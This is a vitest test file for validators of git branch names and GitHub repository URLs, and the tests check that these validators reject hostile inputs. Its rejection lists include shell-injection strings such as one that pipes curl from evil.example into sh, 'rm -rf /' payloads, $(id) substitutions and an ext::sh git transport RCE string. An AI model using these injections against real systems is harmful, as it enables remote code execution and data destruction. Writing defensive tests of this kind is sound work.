import { describe, it, expect } from 'vitest'
import { isGitHubRepoUrl, isValidGitBranch } from '../../src/utils/git-branch'

describe('isValidGitBranch', () => {
  it.each([
    'main',
    'feature/fix-bug',
    'autovibe-rator/issue-42',
    'fix-bug',
    'v1.2.3-rc1',
    'a/b/c/d',
  ])('should accept %s', (branch) => {
    expect(isValidGitBranch(branch)).toBe(true)
  })

  it.each([
    '',
    undefined,
    null,
    'evil";curl evil.example|sh;"',   // shell injection via git ref
    'evil";rm -rf /;"',               // quotes are legal in git refnames
    'injection$(id)',
    'injection`id`',
    'has space',
    'has-tab\tchar',
    '../escape',
    'a..b',
    '.hidden',
    '-leading-dash',
    'trailing/slash/',
    'ends.with.lock',
    'a/b.lock/c',
    'ünïcödé',
    'x'.repeat(201),
  ])('should reject %s', (branch) => {
    expect(isValidGitBranch(branch as string)).toBe(false)
  })
})

describe('isGitHubRepoUrl', () => {
  it.each([
    'https://github.com/owner/repo',
    'https://github.com/owner/repo.git',
    'https://github.com/org.name/repo_name.git',
  ])('should accept %s', (url) => {
    expect(isGitHubRepoUrl(url)).toBe(true)
  })

  it.each([
    undefined,
    null,
    '',
    'http://github.com/owner/repo.git',          // not https
    'https://evil.example/owner/repo.git',       // not github.com
    'ext::sh -c curl evil',                      // git transport RCE
    'git@github.com:owner/repo.git',              // ssh
    'file:///tmp/repo',
    'https://github.com/owner/repo.git;rm -rf /',
    'https://github.com/owner/repo/extra/path.git',
  ])('should reject %s', (url) => {
    expect(isGitHubRepoUrl(url as string)).toBe(false)
  })
})
